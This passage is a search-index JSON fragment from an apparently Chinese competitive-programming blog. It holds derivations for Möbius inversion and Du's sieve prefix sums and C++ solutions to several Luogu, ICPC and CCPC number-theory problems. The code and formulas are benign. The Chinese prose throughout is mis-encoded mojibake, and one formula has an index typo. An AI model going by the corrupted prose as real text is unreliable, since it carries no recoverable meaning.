1; for (int i = 2; i \u003c= n; i ++) { if (!st[i]) { primes[cnt ++] = i; mobius[i] = -1; } for (int j = 0; primes[j] * i \u003c= n; j ++) { int t = primes[j] * i; st[t] = 1; if (i % primes[j] == 0) { mobius[t] = 0; break; } mobius[t] = -mobius[i]; } } for (int i = 1; i \u003c= n; i ++) sum[i] = (sum[i - 1] + mobius[i] + mod) % mod; } int Sum(int n) { if (n \u003c N) return sum[n]; if (mp[n]) return mp[n]; int res = 1; for (int l = 2, r; l \u003c= n; l = r + 1) { r = n / (n / l); res = (res - Sum(n / l) * (r - l + 1) % mod + mod) % mod; } return mp[n] = res; } signed main() { get_mobius(N - 1); cin \u003e\u003e n; for (int l = 1, r; l \u003c= n; l = r + 1) { r = n / (n / l); res = (res + (Sum(r) - Sum(l - 1)) * (n / l) % mod * (n / l) % mod * (n / l) % mod + mod) % mod; } cout \u003c\u003c res \u003c\u003c endl; } ","date":"2021-09-17","objectID":"/posts/cp%E6%B4%9B%E8%B0%B7-p6055-rc-02-gcd/:1:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”","æœæ•™ç­›"],"title":"[æ´›è°· P6055] [RC-02] GCD","uri":"/posts/cp%E6%B4%9B%E8%B0%B7-p6055-rc-02-gcd/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ æ±‚ $$\\prod_{i=1} ^{n} \\prod_{j=1}^{n}\\prod_{k=1}^{n}m^{\\gcd(i,j)[k \\mid \\gcd(i,j)]} \\bmod p$$ $n \\le10^9,m \\le 2 Ã—10^9,p\\le 2Ã—10^9$ ï¼Œ$p$æ˜¯è´¨æ•° åˆ†æï¼š ç›¸ä¹˜å˜ä¸ºæŒ‡æ•°ç›¸åŠ  $$m ^ {\\sum\\limits_{i=1}^{n}\\sum\\limits_{j=1}^{n}\\sum\\limits_{k=1}^{n}\\gcd(i,j)[k \\mid \\gcd(i,j)]}$$ çœ‹ä¸€ä¸‹æŒ‡æ•°éƒ¨åˆ† $$\\sum_{i=1}^{n}\\sum_{j=1}^{n}\\sum_{k=1}^{n}\\gcd(i,j)[k \\mid \\gcd(i,j)]$$ å‘ç° $\\sum\\limits_{k=1}^{n}[k \\mid \\gcd(i,j)]$ å°±æ˜¯ $d(\\gcd(i,j))$ $$\\sum_{i=1}^{n}\\sum_{j=1}^{n}\\gcd(i,j)d(\\gcd(i,j))$$ æšä¸¾ $\\gcd(i,j)$ $$\\sum_{k=1}^{n}k \\cdot d(k)\\sum_{i=1}^{n}\\sum_{j=1}^{n}[\\gcd(i,j)=k]$$ $k$ æ‹¿åˆ°ä¸Šç•Œ $$\\sum_{k=1}^{n}k \\cdot d(k)\\sum_{i=1}^{\\lfloor \\frac{n}{k} \\rfloor }\\sum_{j=1}^{\\lfloor \\frac{n}{k} \\rfloor}[\\gcd(i,j)=1]$$ å› ä¸º $\\sum\\limits_{i=1}^{n}\\sum\\limits_{i=1}^{n}[\\gcd(i,j)=1]=\\sum\\limits_{i=1}^{n}2\\varphi(i)-1$ï¼Œæ‰€ä»¥ $$\\sum_{k=1}^{n}k \\cdot d(k)(\\sum_{i=1}^{\\lfloor \\frac{n}{k} \\rfloor }2\\varphi(i)-1)$$ å¯¹äº $\\sum\\limits_{k=1}^{n}k \\cdot d(k)$ $$\\sum_{k=1}^{n}k \\cdot d(k)=\\sum_{k=1} ^ {n} \\sum_{d \\mid k}k=\\sum_{d=1}^{n}d\\sum_{k=1} ^{\\lfloor \\frac{n}{d} \\rfloor}k=\\sum_{d=1}^{n}d\\frac{\\lfloor \\frac{n}{d}\\rfloor^2+\\lfloor \\frac{n}{d}\\rfloor}{2}$$ æ›¿æ¢å¾— $$\\sum_{d =1}^{n}d \\frac{\\lfloor \\frac{n}{d}\\rfloor^2+\\lfloor \\frac{n}{d}\\rfloor}{2}(\\sum_{i=1}^{\\lfloor \\frac{n}{d} \\rfloor }2\\varphi(i)-1)$$ æ•´é™¤åˆ†å—+æœæ•™ç­› é‚£ä¹ˆåœ¨æ±‚åŸå¼çš„æ—¶å€™ç”¨ä¸€ä¸‹æ¬§æ‹‰é™å¹‚å°±å¥½äº† ","date":"2021-09-17","objectID":"/posts/cp2019-icpc%E8%A5%BF%E5%AE%89%E9%82%80%E8%AF%B7%E8%B5%9B-product/:0:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”","æœæ•™ç­›"],"title":"[2019 ICPCè¥¿å®‰é‚€è¯·èµ›] Product","uri":"/posts/cp2019-icpc%E8%A5%BF%E5%AE%89%E9%82%80%E8%AF%B7%E8%B5%9B-product/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; const int N = 2e6 + 5; int n, m, mod, primes[N], euler[N], cnt, res, sum[N], d[N], num[N]; bool st[N]; unordered_map\u003cint, int\u003e mp, Mp; void get_eulers(int n) { euler[1] = d[1] = 1; for (int i = 2; i \u003c= n; i ++) { if (!st[i]) { primes[cnt ++] = i; euler[i] = i - 1; d[i] = 2; num[i] = 1; } for (int j = 0; primes[j] \u003c= n / i; j ++) { int t = primes[j] * i; st[t] = 1; if (i % primes[j] == 0) { num[t] = num[i] + 1; euler[t] = primes[j] * euler[i]; d[t] = (d[i] / num[t] * (num[t] + 1)) % mod; break; } euler[t] = (primes[j] - 1) * euler[i]; num[t] = 1; d[t] = (d[i] * 2) % mod; } } for (int i = 1; i \u003c= n; i ++) { sum[i] = (sum[i - 1] + euler[i]) % mod; d[i] = (d[i - 1] + i * d[i]) % mod; } } int qmi(int a, int b) { int res = 1; while (b) { if (b \u0026 1) res = res * a % mod; a = a * a % mod; b \u003e\u003e= 1; } return res; } int Sum_euler(int n) { if (n \u003c N) return sum[n]; if (mp[n]) return mp[n]; int res = n * (n + 1) / 2 % mod; for (int l = 2, r; l \u003c= n; l = r + 1) { r = n / (n / l); res = (res - Sum_euler(n / l) * (r - l + 1) + mod) % mod; } return mp[n] = res; } int Sum(int n) { if (n \u003c N) return d[n]; if (Mp[n]) return Mp[n]; int res = 0; for (int l = 1, r; l \u003c= n; l = r + 1) { r = n / (n / l); res = (res + (l + r) * (r - l + 1) / 2 % mod * (n / l) * (n / l + 1) / 2 % mod) % mod; } return Mp[n] = res; } signed main() { cin \u003e\u003e n \u003e\u003e m \u003e\u003e mod; mod --; get_eulers(N - 1); for (int l = 1, r; l \u003c= n; l = r + 1) { r = n / (n / l); res = (res + (2 * Sum_euler(n / l) - 1) * (Sum(r) - Sum(l - 1) + mod) % mod) % mod; } mod ++; cout \u003c\u003c qmi(m, res) \u003c\u003c endl; } ","date":"2021-09-17","objectID":"/posts/cp2019-icpc%E8%A5%BF%E5%AE%89%E9%82%80%E8%AF%B7%E8%B5%9B-product/:1:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”","æœæ•™ç­›"],"title":"[2019 ICPCè¥¿å®‰é‚€è¯·èµ›] Product","uri":"/posts/cp2019-icpc%E8%A5%BF%E5%AE%89%E9%82%80%E8%AF%B7%E8%B5%9B-product/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ $T$ ç»„è¯¢é—®ï¼Œå›ç­”ç¬¬ $K_i$ ä¸ªä¸æ˜¯å®Œå…¨å¹³æ–¹æ•°çš„æ­£æ•´æ•°å€çš„æ•°ã€‚ $1\\le K_i \\le 10^9,T \\le 50$ åˆ†æï¼š ","date":"2021-09-15","objectID":"/posts/cp%E6%B4%9B%E8%B0%B7-p4318-%E5%AE%8C%E5%85%A8%E5%B9%B3%E6%96%B9%E6%95%B0/:0:0","tags":["æœæ•™ç­›"],"title":"[æ´›è°· P4318] å®Œå…¨å¹³æ–¹æ•°","uri":"/posts/cp%E6%B4%9B%E8%B0%B7-p4318-%E5%AE%8C%E5%85%A8%E5%B9%B3%E6%96%B9%E6%95%B0/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æ³•ä¸€ï¼š å¦‚æœä¸€ä¸ªæ•° $n$ ä¸æ˜¯å®Œå…¨å¹³æ–¹æ•°ï¼Œé‚£ä¹ˆ $n=p_1^{\\alpha_1}p_2^{\\alpha_2} \\cdots p_k^{\\alpha_k}$ ä¸­ $0 \\le \\alpha_i \\le 1$ï¼Œæ‰€ä»¥å°±æƒ³åˆ°äº†è«æ¯”ä¹Œæ–¯å‡½æ•°ï¼Œé‚£ä¹ˆé¢˜ç›®è¦è¯¢é—®ç¬¬ $K$ ä¸ªæ•°æ˜¯ä»€ä¹ˆï¼Œå¯ä»¥ç”¨äºŒåˆ†æ¥è§£å†³ï¼Œä½†æ˜¯å¿…é¡»è¦æœ‰å•è°ƒæ€§ï¼Œè«æ¯”ä¹Œæ–¯å‡½æ•°å‰ç¼€å’Œå¯èƒ½å­˜åœ¨è´Ÿæ•°ï¼Œæ‰€ä»¥å°±æƒ³åˆ°æŠŠè«æ¯”ä¹Œæ–¯å‡½æ•°åšä¸€ä¸ªå¹³æ–¹ï¼Œè¿™æ ·å‰ç¼€å’Œå°±æ²¡æœ‰è´Ÿæ•°äº†ï¼Œå°±æœ‰äº†å•è°ƒæ€§ã€‚ ç°åœ¨è€ƒè™‘å¦‚ä½•è®¡ç®— $\\sum\\limits_{i=1} ^{n} \\mu^2(i)$ï¼Œæ ¹æ®æ•°æ®èŒƒå›´æ¥çœ‹å¿…é¡»è¦ç”¨æœæ•™ç­›æ¥å¿«é€Ÿæ±‚å‰ç¼€å’Œï¼Œè®¾ $f(n)=\\mu^2(n)$ï¼Œé‚£ä¹ˆè®¾ $g(n)=[n=k ^ 2,k \\in N^+]$ï¼Œå‘ç° $f*g=1$ï¼Œæ‰€ä»¥ $$S(n)=n-\\sum_{i=2}^{n}g(i)S(\\lfloor \\frac{n}{i} \\rfloor)$$ æ”¹ä¸ºæšä¸¾å¹³æ–¹ $$S(n)=n-\\sum_{i=2}^{\\sqrt{n}}S(\\lfloor \\frac{n}{i^2} \\rfloor)$$ ","date":"2021-09-15","objectID":"/posts/cp%E6%B4%9B%E8%B0%B7-p4318-%E5%AE%8C%E5%85%A8%E5%B9%B3%E6%96%B9%E6%95%B0/:1:0","tags":["æœæ•™ç­›"],"title":"[æ´›è°· P4318] å®Œå…¨å¹³æ–¹æ•°","uri":"/posts/cp%E6%B4%9B%E8%B0%B7-p4318-%E5%AE%8C%E5%85%A8%E5%B9%B3%E6%96%B9%E6%95%B0/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ($O_2$ä¼˜åŒ–)ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; const int N = 2e6 + 5; unordered_map\u003cint,int\u003e mp; int T, n, mobius[N], primes[N], cnt, sum[N]; bool st[N]; void get_mobius(int n) { mobius[1] = 1; for (int i = 2; i \u003c= n; i ++) { if (!st[i]) { primes[cnt ++] = i; mobius[i] = -1; } for (int j = 0; primes[j] * i \u003c= n; j ++) { int t = primes[j] * i; st[t] = 1; if (i % primes[j] == 0) { mobius[t] = 0; break; } mobius[t] = -mobius[i]; } } for (int i = 1; i \u003c= n; i ++) sum[i] = sum[i - 1] + mobius[i] * mobius[i]; } int Sum(int n) { if (n \u003c N) return sum[n]; if (mp[n]) return mp[n]; int res = n; for (int l = 2, r; l * l \u003c= n; l = r + 1) { r = n / (n / l); res -= Sum(n / (l * l)); } return mp[n] = res; } signed main() { get_mobius(N - 1); cin \u003e\u003e T; while (T --) { cin \u003e\u003e n; int l = 1, r = n \u003c\u003c 1; while (l \u003c r) { int mid = l + r \u003e\u003e 1; if (Sum(mid) \u003c n) { l = mid + 1; } else { r = mid; } } cout \u003c\u003c l \u003c\u003c endl; } } ","date":"2021-09-15","objectID":"/posts/cp%E6%B4%9B%E8%B0%B7-p4318-%E5%AE%8C%E5%85%A8%E5%B9%B3%E6%96%B9%E6%95%B0/:2:0","tags":["æœæ•™ç­›"],"title":"[æ´›è°· P4318] å®Œå…¨å¹³æ–¹æ•°","uri":"/posts/cp%E6%B4%9B%E8%B0%B7-p4318-%E5%AE%8C%E5%85%A8%E5%B9%B3%E6%96%B9%E6%95%B0/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æ³•äºŒï¼š $$\\sum_{i=1}^{n} \\mu^2(i)=\\sum_{i=1} ^{n}\\sum_{d^2 \\mid i} \\mu(d)=\\sum_{d=1} ^{\\sqrt{n}} \\mu(d)\\lfloor \\frac{n}{d^2}\\rfloor$$ ","date":"2021-09-15","objectID":"/posts/cp%E6%B4%9B%E8%B0%B7-p4318-%E5%AE%8C%E5%85%A8%E5%B9%B3%E6%96%B9%E6%95%B0/:3:0","tags":["æœæ•™ç­›"],"title":"[æ´›è°· P4318] å®Œå…¨å¹³æ–¹æ•°","uri":"/posts/cp%E6%B4%9B%E8%B0%B7-p4318-%E5%AE%8C%E5%85%A8%E5%B9%B3%E6%96%B9%E6%95%B0/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; const int N = 2e6 + 5; int T, n, mobius[N], primes[N], cnt, sum[N]; bool st[N]; void get_mobius(int n) { mobius[1] = 1; for (int i = 2; i \u003c= n; i ++) { if (!st[i]) { primes[cnt ++] = i; mobius[i] = -1; } for (int j = 0; primes[j] * i \u003c= n; j ++) { int t = primes[j] * i; st[t] = 1; if (i % primes[j] == 0) { mobius[t] = 0; break; } mobius[t] = -mobius[i]; } } for (int i = 1; i \u003c= n; i ++) sum[i] = sum[i - 1] + mobius[i]; } int Sum(int n) { int res = 0; for (int l = 1, r; l * l \u003c= n; l = r + 1) { r = n / (n / l); res += (sum[r] - sum[l - 1]) * (n / (l * l)); } return res; } signed main() { get_mobius(N - 1); cin \u003e\u003e T; while (T --) { cin \u003e\u003e n; int l = 1, r = n \u003c\u003c 1; while (l \u003c r) { int mid = l + r \u003e\u003e 1; if (Sum(mid) \u003c n) { l = mid + 1; } else { r = mid; } } cout \u003c\u003c l \u003c\u003c endl; } } ","date":"2021-09-15","objectID":"/posts/cp%E6%B4%9B%E8%B0%B7-p4318-%E5%AE%8C%E5%85%A8%E5%B9%B3%E6%96%B9%E6%95%B0/:4:0","tags":["æœæ•™ç­›"],"title":"[æ´›è°· P4318] å®Œå…¨å¹³æ–¹æ•°","uri":"/posts/cp%E6%B4%9B%E8%B0%B7-p4318-%E5%AE%8C%E5%85%A8%E5%B9%B3%E6%96%B9%E6%95%B0/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ $T$ ç»„è¾“å…¥ï¼Œç»™å®š $n,a,b$ æ±‚ $$f(n,a,b)=\\sum_{i=1} ^{n}\\sum_{j=1}^{i} \\gcd(i^a-j^a, i ^ b - j ^ b)[\\gcd(i,j)=1]$$ å¯¹ $10^9+7$ å–æ¨¡ï¼Œ$1 \\le n,a,b \\le10^9$ $a,b$ äº’è´¨ åˆ†æï¼š $\\gcd$ çš„æ€§è´¨ï¼š $$\\gcd(a ^ m - b ^ m, a ^ n - b ^ n)=a^{\\gcd(n,m)}-b^{\\gcd(n,m)}$$ æ¡ä»¶ï¼š$\\gcd(a,b)=1$ å¥—ç”¨ç»“è®ºå¸¦å…¥åŸå¼ $$\\sum_{i=1} ^{n}\\sum_{j=1}^{i}( i -j)[\\gcd(i,j)=1]$$ ä¹Ÿå°±æ˜¯ $$\\sum_{i=1} ^{n}\\sum_{j=1}^{i}i[\\gcd(i,j)=1]-\\sum_{i=1} ^{n}\\sum_{j=1}^{i}j[\\gcd(i,j)=1]$$ å‰åŠéƒ¨åˆ†$\\sum\\limits_{i=1} ^{n}i\\sum\\limits_{j=1}^{i}[\\gcd(i,j)=1]$æ˜¯æ¬§æ‹‰å‡½æ•°çš„å®šä¹‰ $\\varphi(i)$ $$\\sum_{i=1} ^{n}i \\varphi(i)-\\sum_{i=1} ^{n}\\sum_{j=1}^{i}j[\\gcd(i,j)=1]$$ çœ‹ååŠéƒ¨åˆ†ï¼Œè¿™ä¸å°±æ˜¯ç–¯ç‹‚LCMé‚£ä¸ªé¢˜å—ï¼Œæ‰€ä»¥æ˜¯ $\\dfrac{i\\varphi(i)+1}{2}$ $$\\sum_{i=1} ^{n}i \\varphi(i)-\\sum_{i=1} ^{n}\\frac{i\\varphi(i)+1}{2}$$ æ•´ç†å¾— $$\\sum_{i=1} ^{n}\\frac{i\\varphi(i)-1}{2}$$ ç”¨æœæ•™ç­›ï¼Œä»¤ $f(x)=x\\varphi(x)$ï¼Œä»¤ $S(n)=\\sum\\limits_{i=1} ^{n}f(i)$ $$g(1)S(n) = \\sum_{i=1} ^{n}f*g-\\sum_{i=2}^{n} g(i)S(\\lfloor\\frac{n}{i} \\rfloor)$$ $$f*g=\\sum_{d \\mid n} d\\varphi(d)g(\\frac{n}{d})$$ è¦æ¶ˆæ‰ä¸€ä¸ª $d$ï¼Œæ‰€ä»¥ä»¤ $g(x)=x$ $$f*g=n\\sum_{d \\mid n} \\varphi(d)=n \\cdot \\varphi * I$$ å› ä¸º $\\varphi*I=Id$ï¼Œæ‰€ä»¥ $f * g=n^2$ï¼Œæœæ•™ç­›åŸå¼ä¸º $$S(n) = \\sum_{i=1} ^{n}i^2-\\sum_{i=2}^{n} iS(\\lfloor\\frac{n}{i} \\rfloor)$$ $\\sum\\limits_{i=1}^{n}i^2=\\dfrac{n(n+1)(2n+1)}{6}$ ","date":"2021-09-14","objectID":"/posts/cp2019-ccpc%E7%BD%91%E7%BB%9C%E8%B5%9B-huntian-oy/:0:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”","æœæ•™ç­›"],"title":"[2019 CCPCç½‘ç»œèµ›] huntian oy","uri":"/posts/cp2019-ccpc%E7%BD%91%E7%BB%9C%E8%B5%9B-huntian-oy/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; const int N = 2e6 + 5, mod = 1e9 + 7; int T, a, b, n, primes[N], euler[N], cnt, sum[N], inv2, inv6; bool st[N]; unordered_map\u003cint, int\u003e mp; int qmi(int a, int b) { int res = 1; while (b) { if (b \u0026 1) res = res * a % mod; a = a * a % mod; b \u003e\u003e= 1; } return res; } void get_eulers(int n) { euler[1] = 1; for (int i = 2; i \u003c= n; i ++) { if (!st[i]) { primes[cnt ++] = i; euler[i] = i - 1; } for (int j = 0; primes[j] \u003c= n / i; j ++) { int t = primes[j] * i; st[t] = 1; if (i % primes[j] == 0) { euler[t] = primes[j] * euler[i]; break; } euler[t] = (primes[j] - 1) * euler[i]; } } for (int i = 1; i \u003c= n; i ++) sum[i] = (sum[i - 1] + i * euler[i] % mod) % mod; } int s2(int n) { return n * (n + 1) % mod * (2 * n + 1) % mod * inv6 % mod; } int Sum(int n) { if (n \u003c N) return sum[n]; if (mp[n]) return mp[n]; int res = s2(n); for (int l = 2, r; l \u003c= n; l = r + 1) { r = n / (n / l); res = (res - (r - l + 1) * (l + r) % mod * inv2 % mod * Sum(n / l) % mod + mod) % mod; } return mp[n] = res; } signed main() { inv2 = qmi(2, mod - 2); inv6 = qmi(6, mod - 2); get_eulers(N - 1); cin \u003e\u003e T; while (T --) { cin \u003e\u003e n \u003e\u003e a \u003e\u003e b; cout \u003c\u003c (Sum(n) - 1 + mod) % mod * inv2 % mod \u003c\u003c endl; } } ","date":"2021-09-14","objectID":"/posts/cp2019-ccpc%E7%BD%91%E7%BB%9C%E8%B5%9B-huntian-oy/:1:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”","æœæ•™ç­›"],"title":"[2019 CCPCç½‘ç»œèµ›] huntian oy","uri":"/posts/cp2019-ccpc%E7%BD%91%E7%BB%9C%E8%B5%9B-huntian-oy/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"é¢˜ç›®é“¾æ¥ é¢˜æ„ï¼š æ±‚ $$\\sum_{i=1}^{n}\\sum_{j=1}^{n}ij\\gcd(i,j)$$ å¯¹ $p$ å–æ¨¡ï¼Œ$n \\le10^{10}, 5 Ã—10^8\\le p \\le1.1 Ã—10^{9}$ åˆ†æï¼š $$\\sum_{i=1}^{n}\\sum_{j=1}^{n}ij\\gcd(i,j)$$ æšä¸¾ $\\gcd(i,j)$ $$\\sum_{d=1} ^{n} d \\sum_{i=1}^{n}\\sum_{j=1}^{n}ij[\\gcd(i,j)=d]$$ åˆ©ç”¨ $\\gcd$ çš„æ€§è´¨ $$\\sum_{d=1} ^{n} d \\sum_{i=1}^{n}\\sum_{j=1}^{n}ij[\\gcd(\\frac{i}{d},\\frac{j}{d})=1]$$ è®©å¼å­é™¤ $d^2$ å†ä¹˜ $d^2$ $$\\sum_{d=1} ^{n} d^3 \\sum_{i=1}^{n}\\sum_{j=1}^{n} \\frac{i}{d} \\cdot \\frac{j}{d}[\\gcd(\\frac{i}{d},\\frac{j}{d})=1]$$ æ¢ä¸€ä¸‹ä¸Šç•Œ $$\\sum_{d=1} ^{n} d^3 \\sum_{i=1}^{\\lfloor \\frac{n}{d} \\rfloor}\\sum_{j=1}^{\\lfloor \\frac{n}{d} \\rfloor} i j[\\gcd(i,j)=1]$$ è«æ¯”ä¹Œæ–¯åæ¼” $$\\sum_{d=1} ^{n} d^3 \\sum_{i=1}^{\\lfloor \\frac{n}{d} \\rfloor}\\sum_{j=1}^{\\lfloor \\frac{n}{d} \\rfloor} i j \\sum_{k \\mid \\gcd(i,j)} \\mu(k)$$ äº¤æ¢æ±‚å’Œæ¬¡åº $$\\sum_{d=1} ^{n} d^3 \\sum_{k=1} ^{\\lfloor \\frac{n}{d} \\rfloor} \\mu(k) \\sum_{i=1}^{\\lfloor \\frac{n}{dk} \\rfloor} ik\\sum_{j=1}^{\\lfloor \\frac{n}{dk} \\rfloor} jk$$ åŒ–ç®€ååŠéƒ¨åˆ† $$\\sum_{d=1} ^{n} d^3 \\sum_{k=1} ^{\\lfloor \\frac{n}{d} \\rfloor} k^2 \\mu(k) (\\sum_{i=1} ^{\\lfloor \\frac{n}{dk} \\rfloor}i)^2$$ è®¾ $T=dk$ $$\\sum_{T=1} ^{n} T^2 \\sum_{d \\mid T} d\\mu(\\frac{T}{d}) (\\sum_{i=1} ^{\\lfloor \\frac{n}{T} \\rfloor}i)^2$$ å› ä¸º $\\mu * Id=\\varphi$ï¼Œæ›¿æ¢ $\\sum \\limits_{d \\mid T} d\\mu(\\frac{T}{d})$ å¾— $$\\sum_{T=1} ^{n} T^2 \\varphi(T) (\\sum_{i=1} ^{\\lfloor \\frac{n}{T} \\rfloor}i)^2$$ æ ¹æ® $(\\dfrac{n^2 +n}{2})^2=1^3+2^3+\\cdots+n^3$ $$\\sum_{T=1} ^{n} T^2 \\varphi(T) \\sum_{i=1} ^{\\lfloor \\frac{n}{T} \\rfloor}i^3$$ è®¾ $f(x)= x^2\\varphi(x)$ å¥—ç”¨æœæ•™ç­›ï¼Œ$S(n)$ ä¸º $\\sum \\limits_{i=1}^{n} f(i)$ $$g(1)S(n)=\\sum_{i=1} ^{n}h(i)-\\sum_{i=1}^{n}g(i)S(\\lfloor \\frac{n}{i} \\rfloor)$$ é‚£ä¹ˆ $h=f *g$ï¼Œä¹Ÿå°±æ˜¯ $h(n)=\\sum \\limits _{d \\mid n}f(n)g(\\dfrac{n}{d})$ï¼Œå¸¦å…¥ $f(n)$ å¾— $$h(n)=\\sum_{d \\mid n} d^2\\varphi(d)g(\\frac{n}{d})$$ è€ƒè™‘æŠŠ $d^2$ æ¶ˆå»ï¼Œæ‰€ä»¥è®¾ $g(x)=x^2$ï¼Œæ•… $$h(n)=n^2\\sum_{d \\mid n}\\varphi(d)$$ æ ¹æ® $\\varphi *I=Id$ $$h(n)=n^3$$ é‚£ä¹ˆ $f(x)$ çš„å‰ç¼€å’Œå°±æ˜¯ $$S(n)=(\\frac{n^2+n}{2})^2-\\sum_{i=2} ^{n}i^2S(\\lfloor \\frac{n}{i} \\rfloor)$$ ","date":"2021-09-13","objectID":"/posts/cp%E6%B4%9B%E8%B0%B7-p3768-%E7%AE%80%E5%8D%95%E7%9A%84%E6%95%B0%E5%AD%A6%E9%A2%98/:0:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”"],"title":"[æ´›è°· P3768] ç®€å•çš„æ•°å­¦é¢˜","uri":"/posts/cp%E6%B4%9B%E8%B0%B7-p3768-%E7%AE%80%E5%8D%95%E7%9A%84%E6%95%B0%E5%AD%A6%E9%A2%98/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; const int N = 5e6 + 5; int mod, n, euler[N], primes[N], cnt, sum[N], inv, res; bool st[N]; unordered_map\u003cint, int\u003e mp; int qmi(int a, int b) { int res = 1; while (b) { if (b \u0026 1) res = res * a % mod; a = a * a % mod; b \u003e\u003e= 1; } return res; } void get_eulers(int n) { euler[1] = 1; for (int i = 2; i \u003c= n; i ++) { if (!st[i]) { primes[cnt ++] = i; euler[i] = i - 1; } for (int j = 0; primes[j] \u003c= n / i; j ++) { int t = primes[j] * i; st[t] = 1; if (i % primes[j] == 0) { euler[t] = primes[j] * euler[i]; break; } euler[t] = (primes[j] - 1) * euler[i]; } } for (int i = 1; i \u003c= n; i ++) sum[i] = (sum[i - 1] + i * i % mod * euler[i] % mod) % mod; } int s2(int n) { n %= mod; return n * (n + 1) % mod * (2 * n + 1) % mod * inv % mod; } int s3(int n) { n %= mod; return (n * (n + 1) / 2) % mod * ((n * (n + 1) / 2) % mod) % mod; } int Sum(int n) { if (n \u003c N) return sum[n]; if (mp[n]) return mp[n]; int res = s3(n); for (int l = 2, r; l \u003c= n; l = r + 1) { r = n / (n / l); res -= (s2(r) - s2(l - 1) + mod) % mod * Sum(n / l) % mod; res = (res + mod) % mod; } return mp[n] = res; } signed main() { cin \u003e\u003e mod \u003e\u003e n; get_eulers(N - 1); inv = qmi(6, mod - 2); for (int l = 1, r; l \u003c= n; l = r + 1) { r = n / (n / l); res += (Sum(r) - Sum(l - 1) + mod) % mod * s3(n / l) % mod; res = (res % mod + mod) % mod; } cout \u003c\u003c res \u003c\u003c endl; } ","date":"2021-09-13","objectID":"/posts/cp%E6%B4%9B%E8%B0%B7-p3768-%E7%AE%80%E5%8D%95%E7%9A%84%E6%95%B0%E5%AD%A6%E9%A2%98/:1:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”"],"title":"[æ´›è°· P3768] ç®€å•çš„æ•°å­¦é¢˜","uri":"/posts/cp%E6%B4%9B%E8%B0%B7-p3768-%E7%AE%80%E5%8D%95%E7%9A%84%E6%95%B0%E5%AD%A6%E9%A2%98/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æœæ•™ç­› æœæ•™ç­›å¯ä»¥åœ¨ $O(n ^{\\frac{2}{3}})$ çš„å¤æ‚åº¦å†…æ±‚è§£ç§¯æ€§å‡½æ•°çš„å‰ç¼€å’Œ è®¾æ•°è®ºå‡½æ•° $f(x)$ï¼Œæ±‚ $$\\sum_{i=1}^{n}f(i)$$ ä»¤ $S(n) = \\sum \\limits_{i=1} ^{n} f(i)$ï¼Œæ‰¾ä¸€ä¸ªæ•°è®ºå‡½æ•° $g(x)$ ä¸ $f(x)$ åšå·ç§¯ $$\\sum_{i=1} ^ {n} f * g = \\sum_{i=1} ^{n}g *f$$ å±•å¼€å·ç§¯ $$\\sum_{i=1}^{n} \\sum_{d \\mid i}g(d)f(\\frac{i}{d})$$ äº¤æ¢æ±‚å’Œæ¬¡åº $$\\sum_{d=1} ^{n}g(d) \\sum_{i=1}^{\\lfloor\\frac{n}{d} \\rfloor} f(i)$$ ååŠéƒ¨åˆ†å…¶å®å°±æ˜¯ $S(\\lfloor\\dfrac{n}{d} \\rfloor)$ï¼Œæ¢ä¸€ä¸‹å˜é‡åå¾— $$\\sum_{i=1} ^{n}g(i)S(\\lfloor\\frac{n}{i} \\rfloor)$$ é‚£ä¹ˆå°±æœ‰é€’æ¨å…¬å¼ $$g(1)S(n) = \\sum_{i=1} ^{n}f*g-\\sum_{i=2}^{n} g(i)S(\\lfloor\\frac{n}{i} \\rfloor)$$ å‡è®¾ $\\sum\\limits _{i=1} ^{n}f*g$ å¯ä»¥å¿«é€Ÿæ±‚å‡ºï¼ŒååŠéƒ¨åˆ†åˆ™å¯ä»¥ç”¨æ•°è®ºåˆ†å—æ±‚è§£ ","date":"2021-09-13","objectID":"/posts/cp%E6%9D%9C%E6%95%99%E7%AD%9B/:1:0","tags":["æ•°è®º","æœæ•™ç­›"],"title":"æœæ•™ç­›","uri":"/posts/cp%E6%9D%9C%E6%95%99%E7%AD%9B/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"è«æ¯”ä¹Œæ–¯å‡½æ•°å‰ç¼€å’Œ ç”±ç‹„åˆ©å…‹é›·å·ç§¯ $$\\varepsilon = \\mu * I$$ è®¾ $h=\\varepsilon,f=\\mu,g=I$ å¥—ç”¨æœæ•™ç­› $$S(n) = \\sum_{i=1} ^{n}\\varepsilon(i)-\\sum_{i=2}^{n} I(i)S(\\lfloor\\frac{n}{i} \\rfloor)$$ åŒ–ç®€å¯å¾— $$S(n) = 1 - \\sum_{i=2}^{n} S(\\lfloor\\frac{n}{i} \\rfloor)$$ ","date":"2021-09-13","objectID":"/posts/cp%E6%9D%9C%E6%95%99%E7%AD%9B/:2:0","tags":["æ•°è®º","æœæ•™ç­›"],"title":"æœæ•™ç­›","uri":"/posts/cp%E6%9D%9C%E6%95%99%E7%AD%9B/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æ¬§æ‹‰å‡½æ•°å‰ç¼€å’Œ æ³•ä¸€: 